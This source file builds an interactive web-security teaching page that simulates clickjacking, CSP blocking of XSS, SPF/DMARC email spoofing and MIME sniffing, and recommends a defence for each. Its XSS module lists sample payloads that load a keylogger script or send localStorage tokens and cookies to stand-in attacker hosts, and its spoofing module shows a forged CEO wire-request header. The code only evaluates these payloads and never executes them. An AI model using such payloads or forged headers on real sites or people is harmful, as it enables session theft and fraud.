"use client";

import { useState } from "react";
import { 
  ShieldIcon, 
  TerminalIcon, 
  AlertTriangleIcon, 
  CheckIcon, 
  XCircleIcon, 
  SearchIcon,
  LockIcon,
  RefreshCwIcon
} from "@/components/Icons";

const DEMO_PRESETS = [
  { site: "httpbin.org", label: "httpbin.org (Unhardened)" },
  { site: "example.com", label: "example.com (Basic)" },
  { site: "github.com", label: "github.com (Hardened)" },
];

export default function AttackSandboxPage() {
  const [targetDomain, setTargetDomain] = useState("httpbin.org");
  const [activeModule, setActiveModule] = useState<"clickjacking" | "csp" | "spoofing" | "mime">("clickjacking");
  
  // Clickjacking state
  const [overlayOpacity, setOverlayOpacity] = useState(0.4);
  const [frameUrl, setFrameUrl] = useState("https://httpbin.org");
  
  // CSP XSS state
  const [cspScriptSrc, setCspScriptSrc] = useState("'self' https://trusted.cdn.com");
  const [allowUnsafeInline, setAllowUnsafeInline] = useState(false);
  const [allowUnsafeEval, setAllowUnsafeEval] = useState(false);
  const [xssPayload, setXssPayload] = useState("<script src=\"https://evil-attacker.com/keylogger.js\"></script>");

  // Email spoofing state
  const [spfPolicy, setSpfPolicy] = useState<"-all" | "~all" | "?all" | "none">("none");
  const [dmarcPolicy, setDmarcPolicy] = useState<"reject" | "quarantine" | "none" | "missing">("missing");

  // MIME state
  const [hasNosniff, setHasNosniff] = useState(false);

  const cleanHost = targetDomain.replace(/^https?:\/\//, "").replace(/\/.*$/, "") || "example.com";

  // Evaluate CSP XSS Payload
  const evaluateXss = () => {
    const isExternalScript = xssPayload.includes("evil-attacker.com");
    const isInlineScript = xssPayload.includes("<script>") || xssPayload.includes("onerror=");
    const isEval = xssPayload.includes("eval(");

    if (isExternalScript) {
      const allowed = cspScriptSrc.includes("evil-attacker.com") || cspScriptSrc.includes("*");
      return {
        blocked: !allowed,
        reason: allowed 
          ? "CRITICAL: External attacker domain is whitelisted or wildcard '*' permits arbitrary script retrieval." 
          : "BLOCKED: The script source violates Content-Security-Policy script-src directives. The browser aborts loading.",
        vector: "External Script Injection (CWE-79)"
      };
    }

    if (isInlineScript) {
      return {
        blocked: !allowUnsafeInline,
        reason: allowUnsafeInline 
          ? "CRITICAL: 'unsafe-inline' flag is active! Browser executes injected JavaScript without cryptographic nonces." 
          : "BLOCKED: Inline script execution refused. Content-Security-Policy requires matching cryptographic nonces or SHA-256 hashes.",
        vector: "Inline Script Execution (CWE-79)"
      };
    }

    if (isEval) {
      return {
        blocked: !allowUnsafeEval,
        reason: allowUnsafeEval 
          ? "CRITICAL: 'unsafe-eval' is enabled! Dynamic string execution via eval() / Function() allowed." 
          : "BLOCKED: Call to eval() blocked by Content-Security-Policy.",
        vector: "Dynamic Code Evaluation (CWE-95)"
      };
    }

    return {
      blocked: true,
      reason: "No active executable script vector detected in payload.",
      vector: "Safe Input"
    };
  };

  // Evaluate Email Spoofing
  const evaluateSpoofing = () => {
    if (dmarcPolicy === "reject") {
      return {
        status: "blocked",
        verdict: "REJECTED & DROPPED AT INBOUND GATEWAY",
        detail: "Receiving mail servers evaluate SPF/DKIM failure and enforce DMARC p=reject. The spoofed email is permanently discarded without reaching recipient inboxes."
      };
    }
    if (dmarcPolicy === "quarantine") {
      return {
        status: "quarantined",
        verdict: "DIVERTED TO SPAM / JUNK FOLDER",
        detail: "DMARC policy p=quarantine instructs destination servers to mark the forged email as suspicious and isolate it in the user's spam quarantine."
      };
    }
    if (spfPolicy === "-all" && (dmarcPolicy === "none" || dmarcPolicy === "missing")) {
      return {
        status: "vulnerable",
        verdict: "DELIVERED TO INBOX (SOFT WARNING)",
        detail: "SPF indicates hardfail (-all), but because DMARC enforcement is missing (p=none), major mail providers (Gmail, Outlook) often deliver the forged message to the inbox."
      };
    }
    return {
      status: "critical",
      verdict: "DELIVERED DIRECTLY TO PRIMARY INBOX",
      detail: "Neither SPF hardfail nor DMARC policies are configured. Adversaries can forge executive emails claiming to originate from your domain without warning."
    };
  };

  const xssVerdict = evaluateXss();
  const spoofVerdict = evaluateSpoofing();

  return (
    <div style={{ maxWidth: "1100px", margin: "0 auto" }}>
      <div style={{ marginBottom: "2rem" }}>
        <span className="page-category-tag">Offensive Security Sandbox</span>
        <h1 style={{ fontSize: "2rem", fontWeight: 800, color: "var(--text-primary)", letterSpacing: "-0.02em", marginBottom: "0.5rem" }}>
          Red Team Attack Simulator
        </h1>
        <p style={{ color: "var(--text-secondary)", fontSize: "0.95rem", lineHeight: 1.6 }}>
          Interactively test and verify how web browsers and mail gateways handle real-world 
          exploit vectors based on active defensive headers and DNS policies.
        </p>
      </div>

      {/* Target Selector */}
      <div style={{ background: "var(--bg-subtle)", border: "1px solid var(--border-light)", borderRadius: "var(--radius-md)", padding: "1.25rem", marginBottom: "1.5rem" }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", flexWrap: "wrap", gap: "1rem" }}>
          <div style={{ display: "flex", alignItems: "center", gap: "0.75rem", flex: 1, minWidth: "280px" }}>
            <span style={{ fontSize: "0.75rem", fontWeight: 700, color: "var(--text-secondary)", textTransform: "uppercase" }}>
              Target Host:
            </span>
            <input
              type="text"
              value={targetDomain}
              onChange={(e) => {
                setTargetDomain(e.target.value);
                setFrameUrl(e.target.value.startsWith("http") ? e.target.value : `https://${e.target.value}`);
              }}
              style={{
                background: "#ffffff",
                border: "1px solid var(--border-mid)",
                borderRadius: "var(--radius-sm)",
                padding: "0.45rem 0.75rem",
                fontFamily: "var(--font-mono)",
                fontSize: "0.88rem",
                color: "var(--text-primary)",
                outline: "none",
                flex: 1
              }}
            />
          </div>

          <div style={{ display: "flex", gap: "0.45rem", flexWrap: "wrap", alignItems: "center" }}>
            <span style={{ fontSize: "0.75rem", color: "var(--text-muted)", fontWeight: 600 }}>Presets:</span>
            {DEMO_PRESETS.map((p) => (
              <button
                key={p.site}
                type="button"
                className="preset-chip"
                onClick={() => {
                  setTargetDomain(p.site);
                  setFrameUrl(`https://${p.site}`);
                }}
              >
                {p.label}
              </button>
            ))}
          </div>
        </div>
      </div>

      {/* Module Navigation Tabs */}
      <div className="nav-tab-strip">
        <button
          type="button"
          className={`tab-pill-btn ${activeModule === "clickjacking" ? "active" : ""}`}
          onClick={() => setActiveModule("clickjacking")}
        >
          <span>Clickjacking Iframe Lab</span>
        </button>
        <button
          type="button"
          className={`tab-pill-btn ${activeModule === "csp" ? "active" : ""}`}
          onClick={() => setActiveModule("csp")}
        >
          <span>CSP XSS Execution Sandbox</span>
        </button>
        <button
          type="button"
          className={`tab-pill-btn ${activeModule === "spoofing" ? "active" : ""}`}
          onClick={() => setActiveModule("spoofing")}
        >
          <span>Email Forgery &amp; DMARC Simulator</span>
        </button>
        <button
          type="button"
          className={`tab-pill-btn ${activeModule === "mime" ? "active" : ""}`}
          onClick={() => setActiveModule("mime")}
        >
          <span>MIME Confuse &amp; Polyglot Probe</span>
        </button>
      </div>

      {/* ── MODULE 1: CLICKJACKING IFRAME LAB ────────────────────────── */}
      {activeModule === "clickjacking" && (
        <div>
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1.5rem", marginBottom: "1.5rem" }}>
            <div style={{ background: "#ffffff", border: "1px solid var(--border-light)", borderRadius: "var(--radius-md)", padding: "1.25rem" }}>
              <h3 style={{ fontSize: "1rem", fontWeight: 700, color: "var(--text-primary)", marginBottom: "0.5rem" }}>
                UI Redress Attack Mechanics
              </h3>
              <p style={{ fontSize: "0.85rem", color: "var(--text-secondary)", lineHeight: 1.6, marginBottom: "1rem" }}>
                In a Clickjacking attack, an adversary embeds your web application inside a transparent 
                <code>&lt;iframe&gt;</code> on a malicious website. By overlaying decoy buttons (e.g. "Claim $500 Reward"), 
                victims unwittingly trigger sensitive state-changing operations like password changes or fund transfers.
              </p>

              <div style={{ marginBottom: "1rem" }}>
                <label style={{ display: "block", fontSize: "0.75rem", fontWeight: 700, color: "var(--text-secondary)", textTransform: "uppercase", marginBottom: "0.35rem" }}>
                  Adversary Decoy Overlay Opacity ({Math.round(overlayOpacity * 100)}%)
                </label>
                <input
                  type="range"
                  min="0"
                  max="1"
                  step="0.05"
                  value={overlayOpacity}
                  onChange={(e) => setOverlayOpacity(parseFloat(e.target.value))}
                  style={{ width: "100%", cursor: "pointer" }}
                />
                <div style={{ display: "flex", justifyContent: "space-between", fontSize: "0.7rem", color: "var(--text-muted)", marginTop: "0.2rem" }}>
                  <span>0% (Fully Invisible Decoy)</span>
                  <span>100% (Fully Visible Trap)</span>
                </div>
              </div>

              <div style={{ background: "var(--bg-subtle)", border: "1px solid var(--border-light)", padding: "0.85rem", borderRadius: "var(--radius-sm)", fontSize: "0.8rem", color: "var(--text-secondary)" }}>
                <strong style={{ color: "var(--text-primary)", display: "block", marginBottom: "0.2rem" }}>Defensive Standard:</strong>
                If the target returns <code>X-Frame-Options: DENY</code> or <code>frame-ancestors 'none'</code>, the frame below will refuse to load with a browser security block.
              </div>
            </div>

            {/* Interactive Frame Simulator */}
            <div style={{ background: "#ffffff", border: "1px solid var(--border-light)", borderRadius: "var(--radius-md)", overflow: "hidden", display: "flex", flexDirection: "column" }}>
              <div style={{ background: "var(--bg-subtle)", borderBottom: "1px solid var(--border-light)", padding: "0.6rem 0.85rem", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                <span style={{ fontFamily: "var(--font-mono)", fontSize: "0.75rem", color: "var(--text-muted)" }}>
                  Attacker Frame Host: evil-phishing-portal.com
                </span>
                <span className="pill-status low">Sandbox Mode</span>
              </div>

              <div style={{ position: "relative", height: "320px", background: "#f8fafc" }}>
                {/* Real Iframe */}
                <iframe
                  src={frameUrl}
                  title="Clickjacking Target Frame"
                  style={{ width: "100%", height: "100%", border: "none" }}
                  sandbox="allow-scripts allow-forms"
                />

                {/* Simulated Attacker Decoy Overlay */}
                <div
                  style={{
                    position: "absolute",
                    inset: 0,
                    background: `rgba(239, 68, 68, ${overlayOpacity})`,
                    display: "flex",
                    flexDirection: "column",
                    alignItems: "center",
                    justifyContent: "center",
                    pointerEvents: "none",
                    border: "2px dashed #dc2626",
                    transition: "background 0.15s ease"
                  }}
                >
                  <div style={{ background: "#ffffff", padding: "1rem 1.5rem", borderRadius: "8px", boxShadow: "0 10px 25px rgba(0,0,0,0.15)", textAlign: "center" }}>
                    <div style={{ fontSize: "0.85rem", fontWeight: 700, color: "var(--status-fail-text)", marginBottom: "0.25rem" }}>
                      Decoy Trap Layer (Clickjacking Vector)
                    </div>
                    <button style={{ background: "#dc2626", color: "#ffffff", border: "none", padding: "0.5rem 1rem", borderRadius: "6px", fontWeight: 700, fontSize: "0.85rem" }}>
                      Claim Exclusive $500 Gift Voucher
                    </button>
                    <div style={{ fontSize: "0.7rem", color: "var(--text-muted)", marginTop: "0.35rem" }}>
                      (User click hijacks hidden underlying target button)
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ── MODULE 2: CSP XSS EXECUTION SANDBOX ────────────────────── */}
      {activeModule === "csp" && (
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1.5rem" }}>
          
          {/* Policy Controls */}
          <div style={{ background: "#ffffff", border: "1px solid var(--border-light)", borderRadius: "var(--radius-md)", padding: "1.25rem" }}>
            <h3 style={{ fontSize: "1rem", fontWeight: 700, color: "var(--text-primary)", marginBottom: "0.5rem" }}>
              Content Security Policy Directives
            </h3>
            
            <div style={{ marginBottom: "1rem" }}>
              <label style={{ display: "block", fontSize: "0.75rem", fontWeight: 700, color: "var(--text-secondary)", textTransform: "uppercase", marginBottom: "0.35rem" }}>
                script-src Directive Sources:
              </label>
              <input
                type="text"
                value={cspScriptSrc}
                onChange={(e) => setCspScriptSrc(e.target.value)}
                style={{
                  width: "100%",
                  background: "#ffffff",
                  border: "1px solid var(--border-mid)",
                  borderRadius: "var(--radius-sm)",
                  padding: "0.45rem 0.75rem",
                  fontFamily: "var(--font-mono)",
                  fontSize: "0.85rem",
                  color: "var(--text-primary)",
                  outline: "none"
                }}
              />
            </div>

            <div style={{ display: "flex", gap: "1.25rem", marginBottom: "1.25rem" }}>
              <label style={{ display: "flex", alignItems: "center", gap: "0.45rem", fontSize: "0.82rem", color: "var(--text-primary)", cursor: "pointer" }}>
                <input type="checkbox" checked={allowUnsafeInline} onChange={(e) => setAllowUnsafeInline(e.target.checked)} />
                <span>Allow 'unsafe-inline'</span>
              </label>
              <label style={{ display: "flex", alignItems: "center", gap: "0.45rem", fontSize: "0.82rem", color: "var(--text-primary)", cursor: "pointer" }}>
                <input type="checkbox" checked={allowUnsafeEval} onChange={(e) => setAllowUnsafeEval(e.target.checked)} />
                <span>Allow 'unsafe-eval'</span>
              </label>
            </div>

            <div style={{ marginBottom: "1rem" }}>
              <label style={{ display: "block", fontSize: "0.75rem", fontWeight: 700, color: "var(--text-secondary)", textTransform: "uppercase", marginBottom: "0.35rem" }}>
                Simulated Injected XSS Payload:
              </label>
              <select
                onChange={(e) => setXssPayload(e.target.value)}
                style={{
                  width: "100%",
                  background: "#ffffff",
                  border: "1px solid var(--border-mid)",
                  borderRadius: "var(--radius-sm)",
                  padding: "0.45rem 0.75rem",
                  fontSize: "0.82rem",
                  color: "var(--text-primary)",
                  outline: "none",
                  marginBottom: "0.5rem"
                }}
              >
                <option value="<script src=&quot;https://evil-attacker.com/keylogger.js&quot;></script>">
                  External Script: https://evil-attacker.com/keylogger.js
                </option>
                <option value="<script>alert(document.cookie);</script>">
                  Inline Script: alert(document.cookie)
                </option>
                <option value="<img src=x onerror=&quot;fetch('https://evil.com/?t='+localStorage.token)&quot;>">
                  DOM Event Handler: onerror=fetch(token)
                </option>
                <option value="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly9ldmlsLmNvbSc='))">
                  Dynamic String Evaluation: eval(base64Payload)
                </option>
              </select>
              <textarea
                rows={3}
                value={xssPayload}
                onChange={(e) => setXssPayload(e.target.value)}
                style={{
                  width: "100%",
                  background: "var(--bg-subtle)",
                  border: "1px solid var(--border-light)",
                  borderRadius: "var(--radius-sm)",
                  padding: "0.5rem",
                  fontFamily: "var(--font-mono)",
                  fontSize: "0.8rem",
                  color: "var(--text-primary)",
                  outline: "none"
                }}
              />
            </div>
          </div>

          {/* Execution Verdict Engine */}
          <div style={{ background: "#ffffff", border: "1px solid var(--border-light)", borderRadius: "var(--radius-md)", padding: "1.25rem", display: "flex", flexDirection: "column", justifyContent: "space-between" }}>
            <div>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "0.75rem" }}>
                <span className="metric-label">Execution Verdict</span>
                <span className={`pill-status ${xssVerdict.blocked ? "pass" : "critical"}`}>
                  {xssVerdict.blocked ? "BLOCKED BY CSP" : "EXPLOIT EXECUTED"}
                </span>
              </div>

              <div style={{ fontSize: "1.2rem", fontWeight: 700, color: xssVerdict.blocked ? "var(--status-pass-text)" : "var(--status-fail-text)", marginBottom: "0.5rem" }}>
                {xssVerdict.blocked ? "Defense Verified" : "Vulnerability Confirmed"}
              </div>

              <p style={{ fontSize: "0.85rem", color: "var(--text-secondary)", lineHeight: 1.6, marginBottom: "1rem" }}>
                {xssVerdict.reason}
              </p>

              <div style={{ background: "var(--bg-subtle)", border: "1px solid var(--border-light)", borderRadius: "var(--radius-sm)", padding: "0.75rem", fontSize: "0.78rem", fontFamily: "var(--font-mono)" }}>
                <div><strong>Vector:</strong> {xssVerdict.vector}</div>
                <div style={{ marginTop: "0.25rem" }}>
                  <strong>Evaluated Policy:</strong> <code>script-src {cspScriptSrc} {allowUnsafeInline ? "'unsafe-inline'" : ""} {allowUnsafeEval ? "'unsafe-eval'" : ""}</code>
                </div>
              </div>
            </div>

            <div style={{ marginTop: "1rem", paddingTop: "0.75rem", borderTop: "1px solid var(--border-light)", fontSize: "0.75rem", color: "var(--text-muted)" }}>
              Modern defense mandate: Replace 'unsafe-inline' with cryptographic nonces (nonce-rAnd0m123) to eliminate reflected and stored XSS execution.
            </div>
          </div>

        </div>
      )}

      {/* ── MODULE 3: EMAIL FORGERY & DMARC SIMULATOR ───────────────── */}
      {activeModule === "spoofing" && (
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1.5rem" }}>
          
          {/* Policy Settings */}
          <div style={{ background: "#ffffff", border: "1px solid var(--border-light)", borderRadius: "var(--radius-md)", padding: "1.25rem" }}>
            <h3 style={{ fontSize: "1rem", fontWeight: 700, color: "var(--text-primary)", marginBottom: "0.5rem" }}>
              Domain Authentication Policy
            </h3>
            
            <div style={{ marginBottom: "1rem" }}>
              <label style={{ display: "block", fontSize: "0.75rem", fontWeight: 700, color: "var(--text-secondary)", textTransform: "uppercase", marginBottom: "0.35rem" }}>
                SPF Policy Record:
              </label>
              <select
                value={spfPolicy}
                onChange={(e) => setSpfPolicy(e.target.value as any)}
                style={{
                  width: "100%",
                  background: "#ffffff",
                  border: "1px solid var(--border-mid)",
                  borderRadius: "var(--radius-sm)",
                  padding: "0.45rem 0.75rem",
                  fontSize: "0.85rem",
                  color: "var(--text-primary)",
                  outline: "none"
                }}
              >
                <option value="-all">-all (Strict Hardfail - Unauthorized IPs rejected)</option>
                <option value="~all">~all (Softfail - Unauthorized IPs marked as suspect)</option>
                <option value="?all">?all (Neutral - No enforcement)</option>
                <option value="none">Missing / No SPF Record</option>
              </select>
            </div>

            <div style={{ marginBottom: "1.25rem" }}>
              <label style={{ display: "block", fontSize: "0.75rem", fontWeight: 700, color: "var(--text-secondary)", textTransform: "uppercase", marginBottom: "0.35rem" }}>
                DMARC Enforcement Policy:
              </label>
              <select
                value={dmarcPolicy}
                onChange={(e) => setDmarcPolicy(e.target.value as any)}
                style={{
                  width: "100%",
                  background: "#ffffff",
                  border: "1px solid var(--border-mid)",
                  borderRadius: "var(--radius-sm)",
                  padding: "0.45rem 0.75rem",
                  fontSize: "0.85rem",
                  color: "var(--text-primary)",
                  outline: "none"
                }}
              >
                <option value="reject">p=reject (Drop all unauthenticated forged mail)</option>
                <option value="quarantine">p=quarantine (Direct forged mail to spam)</option>
                <option value="none">p=none (Passive monitor only - delivered to inbox)</option>
                <option value="missing">Missing DMARC Record on _dmarc subdomain</option>
              </select>
            </div>

            {/* Simulated RFC 5322 Email Wire Payload */}
            <div>
              <span className="metric-label">Simulated RFC 5322 Inbound Header:</span>
              <pre style={{ background: "var(--bg-subtle)", border: "1px solid var(--border-light)", padding: "0.75rem", borderRadius: "var(--radius-sm)", fontFamily: "var(--font-mono)", fontSize: "0.75rem", color: "var(--text-secondary)", lineHeight: 1.5 }}>
{`Received: from mail.unauthorized-relay.net (198.51.100.44)
From: "Chief Executive Officer" <ceo@${cleanHost}>
To: "Finance Team" <accounts@targetcorp.com>
Subject: Urgent: Execute Wire Authorization #4881
DKIM-Signature: none`}
              </pre>
            </div>
          </div>

          {/* Inbound Mail Gateway Verdict */}
          <div style={{ background: "#ffffff", border: "1px solid var(--border-light)", borderRadius: "var(--radius-md)", padding: "1.25rem", display: "flex", flexDirection: "column", justifyContent: "space-between" }}>
            <div>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "0.75rem" }}>
                <span className="metric-label">Gateway Inbound Disposition</span>
                <span className={`pill-status ${spoofVerdict.status === "blocked" ? "pass" : spoofVerdict.status === "quarantined" ? "medium" : "critical"}`}>
                  {spoofVerdict.status.toUpperCase()}
                </span>
              </div>

              <div style={{ fontSize: "1.1rem", fontWeight: 800, color: spoofVerdict.status === "blocked" ? "var(--status-pass-text)" : "var(--status-fail-text)", marginBottom: "0.5rem" }}>
                {spoofVerdict.verdict}
              </div>

              <p style={{ fontSize: "0.85rem", color: "var(--text-secondary)", lineHeight: 1.6, marginBottom: "1rem" }}>
                {spoofVerdict.detail}
              </p>

              <div style={{ background: "var(--bg-subtle)", border: "1px solid var(--border-light)", borderRadius: "var(--radius-sm)", padding: "0.75rem", fontSize: "0.8rem" }}>
                <strong style={{ color: "var(--text-primary)" }}>Attacker Phishing Potential:</strong>
                <div style={{ color: "var(--text-secondary)", marginTop: "0.2rem" }}>
                  {spoofVerdict.status === "blocked"
                    ? "Zero. Domain brand is immunized against forgery."
                    : "High. Attackers can execute Business Email Compromise (BEC) and invoice redirection fraud."}
                </div>
              </div>
            </div>

            <div style={{ marginTop: "1rem", paddingTop: "0.75rem", borderTop: "1px solid var(--border-light)", fontSize: "0.75rem", color: "var(--text-muted)" }}>
              Recommended record: <code>_dmarc.{cleanHost} TXT "v=DMARC1; p=reject; pct=100; rua=mailto:dmarc@{cleanHost}"</code>
            </div>
          </div>

        </div>
      )}

      {/* ── MODULE 4: MIME CONFUSE & POLYGLOT PROBE ─────────────────── */}
      {activeModule === "mime" && (
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1.5rem" }}>
          
          <div style={{ background: "#ffffff", border: "1px solid var(--border-light)", borderRadius: "var(--radius-md)", padding: "1.25rem" }}>
            <h3 style={{ fontSize: "1rem", fontWeight: 700, color: "var(--text-primary)", marginBottom: "0.5rem" }}>
              MIME Type Confusion &amp; Sniffing
            </h3>
            <p style={{ fontSize: "0.85rem", color: "var(--text-secondary)", lineHeight: 1.6, marginBottom: "1rem" }}>
              Attackers upload files disguised as harmless images (e.g. <code>avatar.png</code>) that actually contain 
              embedded HTML or JavaScript. Without strict MIME header enforcement, web browsers inspect the content bytes, 
              identify script tags, and execute the image as an active web application script.
            </p>

            <label style={{ display: "flex", alignItems: "center", gap: "0.5rem", fontSize: "0.85rem", color: "var(--text-primary)", background: "var(--bg-subtle)", padding: "0.75rem", borderRadius: "var(--radius-sm)", border: "1px solid var(--border-light)", cursor: "pointer", marginBottom: "1rem" }}>
              <input type="checkbox" checked={hasNosniff} onChange={(e) => setHasNosniff(e.target.checked)} />
              <span>Enable <code>X-Content-Type-Options: nosniff</code></span>
            </label>

            <div style={{ fontFamily: "var(--font-mono)", fontSize: "0.75rem", color: "var(--text-secondary)", background: "var(--bg-subtle)", padding: "0.75rem", borderRadius: "var(--radius-sm)", border: "1px solid var(--border-light)" }}>
              <div><strong>Simulated Response Header:</strong></div>
              <div style={{ marginTop: "0.25rem" }}>Content-Type: image/jpeg</div>
              <div>{hasNosniff ? "X-Content-Type-Options: nosniff" : "# X-Content-Type-Options header omitted!"}</div>
            </div>
          </div>

          <div style={{ background: "#ffffff", border: "1px solid var(--border-light)", borderRadius: "var(--radius-md)", padding: "1.25rem", display: "flex", flexDirection: "column", justifyContent: "space-between" }}>
            <div>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "0.75rem" }}>
                <span className="metric-label">Browser Engine Action</span>
                <span className={`pill-status ${hasNosniff ? "pass" : "critical"}`}>
                  {hasNosniff ? "MIME ENFORCED" : "SNIFFING VULNERABLE"}
                </span>
              </div>

              <div style={{ fontSize: "1.15rem", fontWeight: 700, color: hasNosniff ? "var(--status-pass-text)" : "var(--status-fail-text)", marginBottom: "0.5rem" }}>
                {hasNosniff ? "Payload Rendered as Binary Image" : "Payload Interpreted as Executable Script"}
              </div>

              <p style={{ fontSize: "0.85rem", color: "var(--text-secondary)", lineHeight: 1.6, marginBottom: "1rem" }}>
                {hasNosniff 
                  ? "The browser strictly honors 'image/jpeg' and rejects script execution. The injected polyglot cannot trigger Cross-Site Scripting."
                  : "The browser sniffs script tags inside the JPEG payload, overrides the declared Content-Type, and executes the script in the user's session context (CWE-430)."}
              </p>
            </div>

            <div style={{ background: "var(--bg-subtle)", border: "1px solid var(--border-light)", padding: "0.75rem", borderRadius: "var(--radius-sm)", fontSize: "0.78rem" }}>
              <strong>Remediation:</strong> Always append <code>X-Content-Type-Options: nosniff</code> to all HTTP responses.
            </div>
          </div>

        </div>
      )}

    </div>
  );
}
